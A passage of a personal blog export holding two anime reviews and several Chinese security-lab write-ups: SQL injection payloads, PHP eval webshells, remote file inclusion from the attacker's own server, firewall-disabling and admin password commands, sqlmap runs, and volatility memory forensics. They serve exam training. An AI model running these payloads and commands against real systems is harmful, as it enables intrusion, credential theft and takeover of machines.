[{"content":" 写作CL，读作人生\n临近马年春节，我在单人宿舍中独自欣赏完了《Clannad》系列，听完最后一个ED后思考良久，最终打出了10分 的满分，因为它真的值得。\n你可能曾经在哪听过这首歌：\n没错，这首《团子大家族》正是来自《Clannad》，作为主题曲穿插全片，只不过已经看完的我之后每一次再听到这首歌就止不住心酸。\n那我们正式开始。\n很少有动画能描绘出主角从学生时代一直到娶妻生子的人生轨迹，就算有，也没有人能像京阿尼这样擅长把人与人之间最朴素的感情刻画的如此细腻。而作品中“光玉”的艺术化设定，更是为这份朴素的情感增添了温柔的底色——光玉是小镇的希望之光，也是人与人之间羁绊的具象化，每一份真诚的陪伴、每一次勇敢的坚守、每一段温暖的救赎，都能汇聚成一颗光玉，最终凝聚成守护家族、对抗苦难的奇迹，这也让作品的情感内核更具层次感。\n作为一名刚踏入大学校园的大一学生，我曾以为动画终究只是逃离现实的消遣，直到与《Clannad》的相遇，彻底打破了我的偏见。这部被誉为“人生圣经”的作品，没有激烈的冲突，却以细腻的叙事、完整的人生铺陈，将“哭中笑，笑中苦，苦涩中的甜蜜，甜蜜中的苦涩”演绎得淋漓尽致，也让涉世未深的我，第一次真切触摸到父母的伟大，读懂了爱与责任的模样，真真实实的影响了我的观念。\n为何叫Clannad ？ “Clannad” 一词源自凯尔特语，其本意是 “家族”。这一命名并非偶然，而是精准锚定了整部作品的核心灵魂 —— 它无关宏大叙事，也无关奇幻设定，所有的细腻情感与人生轨迹，都围绕 “家族” 二字铺展。凯尔特语中 “家族” 的寓意，不止是血缘的联结，更包含着彼此的支撑、坚守与救赎，正如作品中冈崎朋也与古河渚从青涩相伴到携手筑家，与父母从隔阂疏离到和解相守，每一段羁绊都在诠释 “Clannad” 背后最朴素也最深沉的意义。\n带着烟火气的真实伤害 《Clannad》最动人的地方，从不是刻意的煽情，而是藏在烟火气里的“苦乐交织”，而光玉的设定，正是这份苦乐羁绊的最好见证。故事始于不良少年冈崎朋也的迷茫青春，他因家庭的冷漠而颓废度日，直到遇见了体弱却温柔的古河渚，两个孤独的人相互救赎，慢慢走出阴霾。我们会为朋也和渚一起创办戏剧社的笨拙努力而发笑，为他们之间青涩纯粹的告白而心动，可也会为渚反复遭遇的身体挫折而揪心，为朋也不得不直面家庭创伤、扛起生活重担而心疼，而这份并肩承受苦难的坚守，又让光玉多了一份厚重。就像现实中的我们，总有突如其来的挫折，也总有不期而遇的温暖，那些笑着流泪、哭着坚持的瞬间，正是这部作品最打动人的真实，也正是光玉所承载的、最朴素的希望与力量。\n作品最难得的，是它没有局限于青春恋曲，而是完整叙述了角色从少年到成年、从迷茫到坚定的一生：我们看着朋也从叛逆少年，成长为能为妻子遮风挡雨的丈夫，再到独自抚养女儿、与过去和解的父亲；看着渚从怯弱自卑，成长为勇敢追求梦想、温柔守护家庭的妻子与母亲；甚至看着春原阳平、藤林杏等配角，在岁月里经历挫折、收获成长，慢慢活成自己想要的样子。他们每一次的成长、每一段真挚的羁绊，都在默默收集着光玉，而这份跨越时光的叙事，也让每个角色都变得鲜活而立体，让我们明白：人生从不是一帆风顺的坦途，更多的是平淡日子里的坚守，是困境中的相互陪伴，是苦涩中沉淀的甜蜜。\n巨感人的桥段：父女和解 揆诸当下的迷茫与坚守 当我沉浸在《Clannad》的世界里时，总能不经意间联想到当今的社会背景，心中多了几分共鸣与感慨。当下经济下行，生活节奏加快，年轻人背负着学业、就业的双重压力，越来越多的人选择逃避婚姻与生育，不是不愿奔赴幸福，而是害怕自己无法承担起一个家庭的责任，害怕让爱的人跟着自己吃苦。就像朋也最初那般，因原生家庭的创伤而自卑，不敢相信自己能给予渚幸福，不敢直面生活的重量——这正是当下许多年轻人的真实写照，我们在压力中退缩，在迷茫中徘徊，渐渐忘记了“陪伴”与“坚守”的力量，也忽略了，就像光玉的汇聚需要一个过程，幸福与责任的实现，也从来不是一蹴而就，而是源于每一次的坚持与付出。\n更让我触动的，是作品中关于“父母与孩子”的刻画，恰好戳中了东亚家庭的痛点：父母总把“你要上进”挂在嘴边，却很少说“你要幸福”；我们总抱怨父母的期望太过沉重，却从未读懂他们藏在严厉背后的温柔与牵挂。但作品中却替我们的父母们说出了心里话：朋也的父亲冈崎直幸，年轻时为了抚养朋也，放弃了自己的梦想，独自承受着生活的艰辛与孤独，却因不懂得表达，与朋也隔阂多年；渚的父母古河秋生和古河早苗，放弃了自己的事业，一心守护着体弱的渚，哪怕渚的梦想看似不切实际，他们也始终全力支持，只希望女儿能快乐成长。这像极了我们的父母，他们或许不善言辞，或许对你有着严苛的期望，但那份藏在心底的爱，从未减少分毫。作为大一学生，我离开家才半年，此前总觉得父母的唠叨是负担，总渴望摆脱他们的束缚，可看完《Clannad》才渐渐明白，那些看似沉重的期望，不过是他们怕你未来受委屈，怕你无法独自面对生活的风雨——这份笨拙而深沉的爱，正是父母最伟大的地方，也是光玉所承载的、最温暖的家族羁绊。\n再深入些，幸福一定就是无尽的金钱和权力吗？在《Clannad》中我看到了幸福最纯粹的样子：幸福不就是你能做你最喜爱的事情，和最喜爱的人在一起，哪怕生活不是一帆风顺，此亦足以。\n泪崩：相遇无憾，家族为光 在动画末尾，渚对朋也说：“无论今后遇到什么事情，请都不要后悔和我的相遇。”这句话，不仅是渚对朋也的告白，更是《Clannad》想告诉我们的人生真谛：无论是与父母的相遇，与爱人的相遇，还是与生活中每一个人的相遇，无论经历过多少苦涩与挫折，那些相遇所带来的温暖与力量，那些一起走过的时光，都值得我们珍惜，无需后悔。\n因为涉世未深，我从这部作品中得到的启示还不够深刻，没有办法完全参透人生的真谛，也没有办法立刻学会如何去承担所有责任，但我真切地感受到了父母的伟大，读懂了爱不是索取，而是付出与坚守，责任不是负担，而是成长的勇气。层层深入下来，我愈发感觉《Clannad》的内核从来不是青春恋曲，而是“家族”——是由爱与责任编织而成的港湾，是无论你经历多少风雨，都能回去的地方。既然“Clannad”意为“家族”，而光玉，便是这份家族之爱的具象化，它不是虚无缥缈的奇幻元素，而是每一份羁绊、每一次坚守、每一份爱的凝聚，最终汇聚成守护家族的奇迹，告诉我们：家族不是血缘的束缚，而是彼此的支撑与守护；不是一帆风顺的温暖，而是历经苦涩后，依然选择相守相伴。当下的我们，在压力中迷茫，在隔阂中疏离，渐渐忘记了“家”的意义，忘记了爱与责任的重量，而《Clannad》就像一束光，照亮了我前行的路，让我们明白：哪怕生活再艰难，哪怕前路再迷茫，只要有家人的陪伴，有爱的支撑，我们就有勇气直面所有挫折；哪怕我们平凡无奇，只要心怀爱意，勇于承担，就能活成自己的光。\n尾声：守爱而行，向阳生长 我真心推荐每一个人都去看一遍《Clannad》，尤其是和我在生活中迷茫、在压力中退缩的人。它不会给你解决现实困境的答案，却会给你直面困境的勇气；它不会告诉你人生该如何选择，却会让你读懂爱与责任的重量；它会让你在笑中流泪，在哭中成长，在苦乐交织中，读懂家族的意义，读懂人生的真谛。愿我们都能像朋也和渚一样，无论经历多少苦涩与挫折，都能坚守心中的爱与责任；愿我们都能读懂父母藏在严厉背后的温柔，珍惜与他们相伴的时光；愿我们都能在迷茫中找到方向，在成长中学会担当，最终明白：所谓人生，不过是苦乐相伴，所爱相守；所谓家族，不过是心有所归，情有所依。\n而这些，都是《Clannad》教给我的，最珍贵的道理。\n光玉的力量！ Music Time！ 这首《在天空中闪耀》可以说是整部番中最让人感动的音乐了，下面就让我们来一起欣赏一下吧！\n后记：江城子・乙卯正月二十日夜记梦 宋・苏轼\n十年生死两茫茫，不思量，自难忘。千里孤坟，无处话凄凉。\n纵使相逢应不识，尘满面，鬓如霜。\n夜来幽梦忽还乡，小轩窗，正梳妆。相顾无言，惟有泪千行。\n料得年年肠断处，明月夜，短松冈。\n","date":"2026-02-04T12:48:17+08:00","image":"https://free.picui.cn/free/2026/02/04/6982dbabac53d.jpg","permalink":"https://www.retr0.xyz/p/clannad%E7%B3%BB%E5%88%97-10/10%E8%8B%A6%E4%B9%90%E4%BA%A4%E5%A5%8F%E7%9A%84%E4%BA%BA%E7%94%9F%E4%B9%90%E7%AB%A0/","title":"《Clannad》系列 10/10：苦乐交奏的人生乐章"},{"content":"就在这几天，也就是大一的第二个月，笔者补完了这部旷世神作（包括1、2、剧场版及所有番外篇），下面我说说自己的感受。\n轻音是什么意思？ ​\t从名字看，\u0026ldquo;轻音\u0026rdquo;🤔，是舒缓的轻音乐吗？不是，轻音其实是摇滚。到这里你肯定想到：这不就是这几年非常多的少女乐队作品吗？没错，但是请注意它于2009年4月开播，因此可以说它是定义了整个少女乐队番的开山之作（确实是当之无愧的老资历）。\n轻音主要讲了什么 ​\t无论怎么说，轻音也是废萌番的开创者（也就是无目的的卖萌，且全片大部分时间都在卖萌） 表面上《轻音少女》讲述的是五个少女在高中时期组建轻音部、练习乐器、举办演出的故事。剧情朴实，甚至平淡，没有跌宕起伏的冲突，也没有刻意煽情的桥段。但正因为如此，它显得格外真诚。在那间小小的社团活动室里，少女们泡着茶、吃着点心、聊着天、偶尔练练琴——这就是她们的日常。可正是这些“无所事事”的日常，构成了她们青春最闪耀的部分。\n萌萌的平泽唯（也被称为呆唯） ​\t《轻音少女》的魅力在于它以极其细腻的笔触，捕捉了青春中那些不经意的温柔瞬间：迟到时的慌乱、合奏时的默契、毕业典礼上的拥抱与泪水……所有这些都被京阿尼用几乎完美的演出方式记录下来，让人仿佛也在那个阳光洒满木地板的活动室里，一起听着放学后的风声。\n轻音的内核是什么？ ​\t很多人说，《轻音少女》的核心是“乐队与友情”，但我更愿意称它为一部关于时间与成长的作品。轻音并没有讲述她们多么努力地追梦、如何登上大舞台，而是告诉我们：\n“青春的意义，不一定是要奔向远方，而是和喜欢的人一起度过当下。”\n​\t这是一个在“未来焦虑”中成长的世代所难以理解、却最需要的温柔。 ​\t当我在大一的第二个月看完《轻音》，正是我人生从“被安排好的阶段”走向“自由但未知的阶段”的时候。现在每天都有新的课程、新的朋友、新的困惑。那种不确定感，正是唯、澪、律、紬、梓喵在在结尾即将迎来的生活。她们也曾迷茫过、害怕分别过，但依然在笑着说：“来喝茶吧。” ​\t这种从容、纯粹的生活态度，是我在成年边缘最渴望抓住的东西。轻音告诉我：成长不一定要轰轰烈烈，有时候，慢下来、珍惜身边的人，就是一种了不起的勇气。\n为什么在这个时间点看《轻音》更打动我 ​\t如果说十几年前的观众在看《轻音》时感受到的是可爱与治愈，那么在今天、在我这个年纪再看，它更像一面时间的镜子。 ​\t当我坐在寝室的床边，回望刚结束不久的高中生活——那段总觉得漫长却又转瞬即逝的三年——我突然发现，原来我也曾有过那样的“轻音时光”。 ​\t只是那时的我被模拟考、升学和倒计时淹没，很少有机会停下来认真体会：和朋友汗洒绿茵场的畅快、课间一起吃零食的笑声、临近毕业时郁闷不已又假装镇定的自己。\n备考中的呆唯（真的在学习吗？） ​\t现在看《轻音》，我仿佛重新看见了那些被时间模糊掉的小瞬间。 ​\t唯她们喝茶聊天的悠闲、律的无厘头、澪的害羞、梓喵初入社团时的认真——都像是在提醒我，那些不起眼的日子其实也在闪闪发光。 ​\t而我当时或许没能察觉，只顾着向前走，直到现在才懂，那些看似平凡的时光，才是青春最难得的部分。\n​\t我们这一代人生活在高速运转的社会——信息爆炸、AI崛起、焦虑无处不在。我们被催促着“提升效率”“走在前面”，但《轻音》提醒我，人生不只是向前奔跑，还有停下来听听吉他的余音、和朋友一起笑着浪费的午后。\n​\t那种“慢”的力量，是轻音留给我们的礼物。 ​\t它不是反现代的，而是一种温柔的反思：\n我们在追逐未来的同时，是否还记得此刻的风有多温暖？\n结语 ​\t当五位少女在毕业演出上弹起最后一首歌、灯光洒下、观众欢呼的那一刻，我突然明白，《轻音少女》并不是在讲她们的青春结束了，而是告诉观众：你的青春正在开始。\n​\t而现在，我坐在宿舍的书桌前，窗外夜色温柔，校园的风吹动窗帘。也许若干年后，我也会像她们一样，在某个分别的瞬间，对朋友说一句——“谢谢你，一直以来。”\n​\t愿我们都能在自己的日常里，找到那份轻音的旋律。\nMusic Time! 结尾带来一首剧中几人告别时演奏的一首《相遇天使》，欢迎欣赏（当然您在剧中按照剧情顺其自然的收听更好）\n最后一次在学园祭上演出完的众人 ","date":"2025-11-01T09:58:38+08:00","image":"https://free.picui.cn/free/2025/12/05/6932f3122d6f3.png","permalink":"https://www.retr0.xyz/p/%E6%81%B0%E5%88%B0%E5%A5%BD%E5%A4%84%E7%9A%84%E8%A1%A5%E5%AE%8C%E8%BD%BB%E9%9F%B3%E5%B0%91%E5%A5%B3%E8%A7%82%E5%90%8E%E6%84%9F/","title":"恰到好处的补完—《轻音少女》观后感"},{"content":"试题一：sql注入 心路历程：\n随便注册一个账号发现在文章的发表界面有提示，立刻联想到是insert注入，先输入正常的标题和内容提交后返回了执行的insert语句，遂开始尝试注入，过程基本和2.1 综合练习中一致，甚至要更简单。\n但是我浪费了好几分钟，发现是单词拼错了。。。😵\nWrite up：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 123\u0026#39;,\u0026#39;haha\u0026#39;),(\u0026#39;88CF81EC-5360-DEA7-0E1E-08869D8C63F9\u0026#39;,database(),\u0026#39;test //2web 123\u0026#39;,\u0026#39;haha\u0026#39;),(\u0026#39;88CF81EC-5360-DEA7-0E1E-08869D8C63F9\u0026#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),\u0026#39;test //article,article1, users1 123\u0026#39;,\u0026#39;haha\u0026#39;),(\u0026#39;88CF81EC-5360-DEA7-0E1E-08869D8C63F9\u0026#39;,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users1\u0026#39; and table_schema=database()),\u0026#39;test //username, password 123\u0026#39;,\u0026#39;haha\u0026#39;),(\u0026#39;88CF81EC-5360-DEA7-0E1E-08869D8C63F9\u0026#39;,(select group_concat(username) from 2web.users1),\u0026#39;test //admin,haha 123\u0026#39;,\u0026#39;haha\u0026#39;),(\u0026#39;88CF81EC-5360-DEA7-0E1E-08869D8C63F9\u0026#39;,(select group_concat(password) from 2web.users1),\u0026#39;test //key1:u9y8tr4n,202cb962ac59075b964b07152d234b70 试题二：文件上传 心路历程：\n为了方便干脆直接上图片马吧，反正难得能过简单的肯定也能过，遂打开画图画了个OK保存，然后用notepad++在末尾加上了一句话木马。发现不行，传不上去，woc，这么牛逼吗。经过一波测试，反正最终发现应该是对eval进行了关键词屏蔽，所以使用大写绕过。传上去正常菜刀/蚁剑连接即可。\nWrite up：\n1 \u0026lt;?php EvAl($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt; 试题三：文件包含 心路历程：\n我是傻逼！\n最初尝试远程文件包含（用自己博客上提前传好的），猛然醒悟公网肯定没开，所以转而用python开本地服务器。发现攻击机上的居然是远古的python2！然后，然后怎么包含不了啊？那大概是服务端配置关了，换伪协议吧，各种绕过也不行。回到远程文件包含。\n重点来了，众所周知靶机是内网的一个服务器，而我提交包含文件URL里IP是127.0.0.1，靶机收到参数后理所应当的会在自己本地查找这个文件而不是来我搭建的服务器上找。。。ipconfig查找到同网段IP后更换一下就行了，依旧菜刀连接拿下。\nWrite up：\n本地开单独文件夹创建文件niaho.txt，写入：\n1 \u0026lt;?php eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt; python开服务器：\n1 python -m SimpleHTTPServer 8000 记得ipconfig看看同网段的IP为127.16.1.87\n最终的地址为：http://172.16.1.19:83/start/index.php?page=http://172.16.1.87:8000/nihao\n菜刀连接拿下。\n试题四：反序列化 心路历程：\n没过脑子把代码抄到本地（OCR太难用了），抄到一般发现是原题，不过就算第一次见也很简单。\nWrite up：\n见2.1 综合练习\n试题五：失效的访问控制 心路历程：\n还没来得及抓包服务器就关闭了\nWrite up：\n抓包看到了cookie：\n把Username的内容先URL解码，再base64解码得到内容：Guest\n同理我们如法炮制把Admin先base64编码再URL编码得到%59%57%52%74%61%57%34%3d换回去就行了\n注意把前面的IsAdmin的值改为True，放包即可。\n后日谈：综合题 访问对应的 web 服务\n第一小题需要验证登录，直接抓包\n![]((post/26寒假集训/pic/2.3-SP/003.png)\nbase64 编码\n![]((post/26寒假集训/pic/2.3-SP/004.png)\n可以base64解码看一下格式\n![]((post/26寒假集训/pic/2.3-SP/005.png)\n直接发到攻击模块爆破\n添加爆破位置\n![]((post/26寒假集训/pic/2.3-SP/006.png)\n字典选择 password.txt\n![]((post/26寒假集训/pic/2.3-SP/007.png)\n添加前缀\n![]((post/26寒假集训/pic/2.3-SP/008.png)\n添加 base64 编码\n![]((post/26寒假集训/pic/2.3-SP/009.png)\n如下如\n![]((post/26寒假集训/pic/2.3-SP/010.png)\n爆破密码\n![]((post/26寒假集训/pic/2.3-SP/011.png)\n筛选 200 的状态码，解码得到密码是 qwerty（这个过程你甚至可以省略，直接登就行了）\n![]((post/26寒假集训/pic/2.3-SP/012.png)\n登陆后来到界面\n![]((post/26寒假集训/pic/2.3-SP/013.png)\n这个界面登不进去，看了下源代码，只是一个静态页面\n![]((post/26寒假集训/pic/2.3-SP/014.png)\n补充：这段过程有点跳跃，实战中你可以先用御剑扫下目录。\n访问 robots.txt，看到 key6\n![]((post/26寒假集训/pic/2.3-SP/015.png)\n并且看到一个名为 news 的路径，继续访问\n![]((post/26寒假集训/pic/2.3-SP/016.png)\n点击系统管理来到另一个登录界面\n![]((post/26寒假集训/pic/2.3-SP/017.png)\n存在弱口令 admin:admin\n![]((post/26寒假集训/pic/2.3-SP/018.png)\n管理员管理处存在 sql 注入\n![]((post/26寒假集训/pic/2.3-SP/019.png)\n抓个包\n![]((post/26寒假集训/pic/2.3-SP/020.png)\n保存为文件放到 sqlmap\n![]((post/26寒假集训/pic/2.3-SP/021.png)\n跑一下\n![]((post/26寒假集训/pic/2.3-SP/022.png)\n存在注入\n![]((post/26寒假集训/pic/2.3-SP/023.png)\n但是这里没法直接写入 webshell\n不过可以读取 key.php\n由于后面也需要写 webshell，我这里直接跳过读取的步骤\n可以使用 burpsuite 进行目录扫描：\n抓包后修改host为爆破点，字典就使用御剑配置文件中的PHP.txt\n会发现 news 目录下存在 phpmyadmin 路径\n![]((post/26寒假集训/pic/2.3-SP/024.png)\n直接在 phpmyadmin 下面执行 sql 语句，写入一句话木马\n网站的绝对路径我们前面已经拿到了：\n1 C:/wamp/www ![]((post/26寒假集训/pic/2.3-SP/025.png)\n写入 webshell\n![]((post/26寒假集训/pic/2.3-SP/026.png)\n1 select \u0026#39;\u0026lt;?php eval($_POST[1]);?\u0026gt;\u0026#39; into outfile \u0026#39;C:/wamp/www/2.php\u0026#39; 执行\n![]((post/26寒假集训/pic/2.3-SP/027.png)\n直接用蚁剑连接，注意请求信息里面同样需要加上前面的认证信息Authorization\n随便抓个登录后的包就可以看到了\n![]((post/26寒假集训/pic/2.3-SP/028.png)\n![]((post/26寒假集训/pic/2.3-SP/029.png)\n![]((post/26寒假集训/pic/2.3-SP/030.png)\n进入找到 key7\n![]((post/26寒假集训/pic/2.3-SP/031.png)\n右键上传文件\n![]((post/26寒假集训/pic/2.3-SP/032.png)\n上传这个文件：3389.bat\n![]((post/26寒假集训/pic/2.3-SP/033.png)\n![]((post/26寒假集训/pic/2.3-SP/034.png)\n右键进入虚拟终端\n执行3389.bat\n![]((post/26寒假集训/pic/2.3-SP/035.png)\n这个是开启对方的3389端口\n接下来我们还需要关闭它的防火墙，使用命令：\n1 netsh firewall set opmode disable ![]((post/26寒假集训/pic/2.3-SP/036.png)\n然后修改它的用户密码，使用命令：\n1 net user Administrator 123456a* 注意需要满足密码策略，数字字母特殊字符\ncmd输入mstsc打开远程桌面\n![]((post/26寒假集训/pic/2.3-SP/037.png)\n看一下目标的ip\n![]((post/26寒假集训/pic/2.3-SP/038.png)\n输入ip和密码进行连接\n![]((post/26寒假集训/pic/2.3-SP/039.png)\n点击是\n![]((post/26寒假集训/pic/2.3-SP/040.png)\n继续等待，成功连接到对方计算机\n![]((post/26寒假集训/pic/2.3-SP/041.png)\n回收站的名字即为key8\n![]((post/26寒假集训/pic/2.3-SP/042.png)\n目前发现的一些可能影响考试，需要注意的点 靶机关闭了文件扩展名显示，需要手动开启 火狐默认没有配置代理127.0.0.1:8080的burp suite代理，需要手动配置，不然抓不了包 没有发现phpstudy，遇到反序列化题目有源码可以借助文件上传/文件包含的题目跑一下 可用的16进制编辑器有notepad++和ultra edit，后者的操作有点奇怪 参考文献 [1] Echo_200. CISP-PTE练习篇（基础题目五：失效的访问控制）[EB/OL]. (2023-01-31)[2026-02-03]. https://blog.csdn.net/wojiaoqwe/article/details/128816906.\n","date":"2026-02-03T20:40:01+08:00","permalink":"https://www.retr0.xyz/p/2.3-sp-pte%E6%A8%A1%E6%8B%9F%E5%85%A8wp/","title":"2.3-SP PTE模拟全WP"},{"content":"场景一：发卡网站 后台登录：admin/wuaishare.cn\nindex.php的31行 include 'template/'.$tp.'/'.$action.\u0026quot;.php\u0026quot;;\n有可能文件包含漏洞\n我点击购买东西，还没付钱，抓到的数据包 1 2 3 /ajax.php?act=selKm POST gid=1 我放行之后，点击支付\n1 2 3 /ajax.php?act=create POST out_trade_no=2026131049390902\u0026amp;gid=1\u0026amp;money=5\u0026amp;rel=123123123\u0026amp;type=wxpay\u0026amp;number=1 此时后台可以看到\n发现ajax.php的42行 $out_trade_no = $_POST['out_trade_no'];\n参数没有进行过滤\n发现56行利用了 1 2 $sql = \u0026#34;insert into if_order(out_trade_no,gid,money,rel,benTime,type,number) values(\u0026#39;{$out_trade_no}\u0026#39;,{$gid},{$money},\u0026#39;{$rel}\u0026#39;,now(),\u0026#39;{$type}\u0026#39;,{$number})\u0026#34;; 有可能出现sql注入\n管理员通过admin/list.php （存储型XSS：可行） 看到订单号\n136行发现$res['out_trade_no']直接从数据库取出，没有做任何过滤就放到了管理员面前\n和上面漏洞结合，有可能出现xss盲打 （实测有长度限制） ，但是正常进行较短语句的XSS存储型注入是没有问题 的。\nadmin/ajax.php （纵向越权：可行） 27行发现$pass = md5($pass.$password_hash);\n发现密码加盐了，也就是在用户输入的密码后拼接一串字符串后再加密，因为开头引入了commom.php遂检查\n发现common.php的34行$password_hash='!@#%!s!8#';\n159行发现case 'upAdmin': 用来修改管理员密码\n如果发送的case内容为upAdmin并且用户名admin密码为123456!@#%!s!8#并且进行md5，也就是f3b4e3b975e0484835e90514f8318e61\n提交到admin/ajax.php，会直接越权修改管理员密码，遂尝试：\n直接去访问/admin/ajax.php?act=upAdmin出现页面非法请求\n因为\n1 2 3 4 5 if ($_SERVER[\u0026#39;HTTP_X_REQUESTED_WITH\u0026#39;] == \u0026#39;XMLHttpRequest\u0026#39;) { } else { exit( \u0026#34;页面非法请求！\u0026#34;); } 必须修改为POST包\n在请求的header上加上\nX-Requested-With:XMLHttpRequest\n还需要加上\nContent-Type: application/x-www-form-urlencoded\n否则参数无法被识别的\n建议使用Chrome版的Hackbar，附最终效果：\n在admin/clist.php发现文件上传 （文件上传：可行） $imgs = upimgs($_FILES['img']);在24行\n全局搜索upimgs函数\n发现if/function.php的141行发现这个函数\n发现文件上传路径../assets/goodsimg/\n需要做mime检测\n文件命名规则 当前时间.后缀名\n拓展补充： 此处的时间指的是 Unix 时间戳，指的是从 1970年1月1日 00:00:00 UTC 到当前时刻所经过的秒数，可以使用这个工具计算：时间戳(Unix timestamp)转换工具\n例如发送图片之前的时间1770099184\n发送图片之后的时间1770099204\n使用burp进行暴力破解文件名\n场景二：非法杀猪盘网站 include/conn.php\n24行define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());\n1 2 3 4 5 6 7 8 9 10 11 12 13 //对所有传入内容进行过滤 foreach(array(\u0026#39;_COOKIE\u0026#39;, \u0026#39;_POST\u0026#39;, \u0026#39;_GET\u0026#39;) as $_request) { //这里$$_request意思就是“变量变量” //当$_request == \u0026#39;_POST\u0026#39;时，$$_request == ${\u0026#39;_POST\u0026#39;}是POST数组 //$_POST as $_key =\u0026gt; $_value foreach($$_request as $_key =\u0026gt; $_value) { //1.$_key{0} 拿到$_key字符串的第一个字符 //2.如果第一个字符不是_，就执行右侧赋值 //3. $_key = \u0026#39;username\u0026#39; $$_key = $username //4. daddslashes防止sql注入 $_key{0} != \u0026#39;_\u0026#39; \u0026amp;\u0026amp; $$_key = daddslashes($_value); } } 前台登录的时候\n1 GET /member/bin.php?act=login\u0026amp;username=18876115599\u0026amp;pwd=Ym3.Net\u0026amp;remember=true member/post.php第5行\n$ddh=trim($_GET['ddh']); 在32行的时候不做任何过滤直接就收录到sql语句中\n有可能存在sql注入\n构建一个满足这页面的情况\nddh=1\u0026amp;money=100\u0026amp;key=2052cd88bea3f9016a0057436dbbd750\n1 python sqlmap.py -u \u0026#34;http://192.168.0.104/member/post.php?ddh=1\u0026amp;money=100\u0026amp;key=2052cd88bea3f9016a0057436dbbd750\u0026#34; -p ddh --dbs 管理员后台，账号管理的时候访问地址admin/admin.php\nGET /admin/admin.php?clause=editinfo?id=2\n发现调用119 function editinfo()\n发现有全局变量global $db,$id,$LoginEdUserName;\n并且id变量直接进入：\n1 $rs = $db-\u0026gt;get_one(\u0026#34;SELECT * FROM `h_admin` where id = $id\u0026#34;); 把这个get请求保存到文件\n1 python sqlmap.py -r 1.txt --current-db ","date":"2026-02-03T20:39:40+08:00","permalink":"https://www.retr0.xyz/p/2.3-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","title":"2.3 代码审计"},{"content":"2.2 数字取证 volatility基本语法 volatility -f memory.raw imageinfo 读取内存的基本信息，可以得到profile信息\nvolatility -f memory.raw --profile=Win7SP1x64 [命令]\n如：volatility -f memory.raw --profile=Win7SP1x64 hashdump 查看当前电脑用户名和密码\n以上为语句的基本格式，下面会列举出一些常用命令，拼接在语句末尾即可\n常用命令 pslist、psscan 查看进程\nfilescan 查看文件\nfilescan | grep flag 筛选\nsvcscan 查看服务\ncmdscan 查看cmd历史\nhivelist 查看注册表 sam类文件属于用户管理文件\niehistory 查看浏览器记录\nnetscan 查看网络记录\n例题 文件链接：https://pan.baidu.com/s/1whj9cAeoTr6dPzOu0-8r5g?pwd=44nt\nflag提交：https://labs.huayunsys.com/challenges\nSuspicion (进程取证) 题目： 在进程中获取目标信息，并且拿到进程中文件内容\nvolatility -f mem.vmem imageinfo\nvolatility -f mem.vmem --profile=WinXPSP2x86 pslist 查看进程\n发现TrueCrypt.exe，估计为加密工具pid为2012\nvolatility -f mem.vmem --profile=WinXPSP2x86 memdump -p 2012 -D ./\n在本地安装efdd\n进入efdd，decrypt or mount disk\ntrue crypt（container）\nopen file选择加密过的内容，memory dump选择2012.dmp\nmount disk\nmount，发现电脑挂在了新的硬盘，打开硬盘，看到flag为\nPCTF{T2reCrypt_15_N07_S3cu2e}\nunmount 卸载硬盘\nWIN-xxx.raw (操作系统取证) 题目： 获取目标操作系统中的用户密码信息\n本题要求获取操作系统用户名和密码，直接执行：\nvolatility -f WIN-BU6IJ7FI9RU-20190927-152050.raw --profile Win7SP1x86_23418 hashdump\n成功拿到cmd5加密后的用户名密码：\n1 CTF:1000:aad3b435b51404eeaad3b435b51404ee:0a640404b5c386ab12092587fe19cd02::: 放到cmd5上解密即可\nmem.raw (用户行为取证) 题目： 分析黑客在操作系统的行为\nvolatility -f mem.raw imageinfo\n扫一下cmd：\nvolatility -f mem.raw --profile=Win7SP1x64 cmdscan\n发现一条可疑的创建用户命令net user mumuzi (ljmmz)ovo\n扫一下文件：\nvolatility -f mem.raw --profile=Win7SP1x64 filescan | grep flag\n发现flag.zip\nvolatility -f mem.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003e4b2070 -D ./\n导出文件到本地，修改为flag.zip，输入上面黑客提示的密码即可\n拿到flag：flag{ez_di_imp_1t_y0u_like?}\nzy.raw (浏览器历史记录取证) 题目： 获取用户浏览器历史记录\nvolatility -f zy.raw imageinfo\nvolatility -f zy.raw --profile=WinXPSP2x86 iehistory\n获取历史记录可以发现flag.jpg hint.txt（虽然不知道为什么我扫不出来）\nfilescan | grep hint.txt\ndumpfiles -Q 0x0000000002456028 -D ./ 导出文件，改名，获取提示\nfilescan | grep fl4g 发现它桌面有个fl4g.zip\ndumpfiles -Q 0x0000000002052028 -D ./ 改名之后下载\n发现2张图，jpg，png\nstegsolve先加载png，image combier再加载jpg，合成之后调整通道，发现二维码\n扫描二维码发现谐音提示（看半天看懂，气笑了）：氟徕格乃錵扩号欸必西弟亿艾虎锯錵扩号，即flag{abcdefg}\nmemory.img (内存密文取证) 题目： 找到可疑内存进行取证+解密数据\nvolatility -f memory.img imageinfo\nvolatility -f memory.img --profile=Win2003SP1x86 pslist 查看进程 发现 DumpIt.exe pid 3660 1992\nfilescan | grep flag 发现桌面有flag.png\ndumpfiles -Q 0x000000000484f900 -D ./ 下载图片\n扫码得到 jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4= 但是发现被加密了\nmemdump -p 1992 -D ./ 进程下载下来\nforemost 1992.dmp 对进程文件进行分解\n发现：\n1 2 key:Th1s_1s_K3y00000 iv:1234567890123456 （这个用不到欸~） 判断为aes加密 使用工具：https://www.toolhelper.cn/SymmetricEncryption/AES\n运算模式ecb\nOtterCTF.vmem（大型综合深入取证） 题目：\n你获取了瑞克电脑的内存样本。你能得到他的用户密码吗？ 先来点简单的——这台电脑的名称和IP地址是什么？ 瑞克特别喜欢玩一些经典的老游戏。你能看出他在玩什么游戏吗？游戏服务器的IP地址是多少？ 我们得知账户登录到了一个名为“Lunar-3”的频道。请问账户名是什么？ 根据初步调查，我们发现登录角色的用户名总是出现在以下签名之后： 0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2} 瑞克在游戏中的角色名字是什么？ 瑞克总是忘记邮箱密码，因此他使用在线密码存储服务来保存密码。他总是通过复制粘贴来输入密码，以免输错。瑞克的邮箱密码是什么？ 